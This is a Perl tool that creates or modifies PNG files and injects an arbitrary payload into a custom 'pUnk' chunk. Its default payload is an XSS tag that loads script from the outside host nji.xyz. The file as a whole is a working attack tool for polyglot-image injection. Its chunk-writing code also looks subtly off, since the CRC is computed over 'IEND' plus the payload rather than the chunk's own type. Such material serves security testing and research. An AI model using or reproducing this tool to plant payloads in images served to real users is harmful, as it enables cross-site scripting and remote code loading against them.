#!/usr/bin/perl
#
# PNG Payload Creator/Injector
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# credits to briandeheus, https://github.com/briandeheus
#
# See LICENSE file for copyright and license details.
#

use strict;
use warnings;
no  warnings    qw(redefine);

use feature     qw(say);

use Getopt::Long;
use GD;
use String::CRC32;

sub systell;
sub rewind;

sub usage;
sub create_png;
sub inject_payload;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0)     if $help;
usage(1) unless $outfile;

$payload //= '<script src=//nji.xyz></script>';

say <<EOF;
[>|      PNG Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload

EOF

create_png              unless -f $outfile;

inject_payload;

say `file       $outfile`   if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   

sub systell {
    sysseek $_[0], 0, 1
}

sub rewind {
    sysseek $_[0], systell($_[0]) - $_[1], 1
}

sub usage {
    say <<"EOF";
Usage: $0 [-payload 'STRING'] -output payload.png

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
EOF
    exit +shift;
}

sub create_png {
    say "[>] Generating output file";

    my $img = GD::Image->new(
        32,
        32,
         1, # Set 1 to TrueColor (24 bits of color data), default is 8-bit palette
    );

    my $color = $img->colorAllocate(0, 0, 0);

    $img->setPixel(0, 0, $color);

    open my $fh, '>', $outfile or die;
    binmode $fh;
    print   $fh  $img->png;
    close   $fh;

    say "[✔] File saved to: $outfile\n";
}

sub inject_payload {
    say "[>] Injecting payload into $outfile\n";

    sysopen our $fh, $outfile, 2;
    sysseek     $fh, 8, 0;

    sub read_chunks {
        *read_next_chunk = \&read_chunks;

        my ($chunk_size, $chunk_type, $content, $crc);

        sysread $fh, $chunk_size, 4;
        sysread $fh, $chunk_type, 4;

        $chunk_size = unpack('I>', $chunk_size);
        
        say "[+] Chunk size: $chunk_size"; 
        say "[+] Chunk type: $chunk_type";

        return if $chunk_type eq 'IEND';

        sysread $fh, $content, $chunk_size;
        sysread $fh, $crc, 4;

        say '[+] CRC: ' . unpack('H8', $crc);

        &read_next_chunk;
    }
    &read_chunks;

    rewind($fh, 8);

    say "\n[>] Inject payload to the new chunk: 'pUnk'";

    # chunk size
    syswrite $fh, (pack 'I>', length $payload);

    # chunk name: pUnk
    syswrite $fh, "\x70\x55\x6e\x6b";

    syswrite $fh, $payload;

    syswrite $fh, (pack 'I>', crc32('IEND' . $payload));

    syswrite $fh, "\x00IEND";

    close    $fh;

    say "[✔] Payload was injected successfully\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
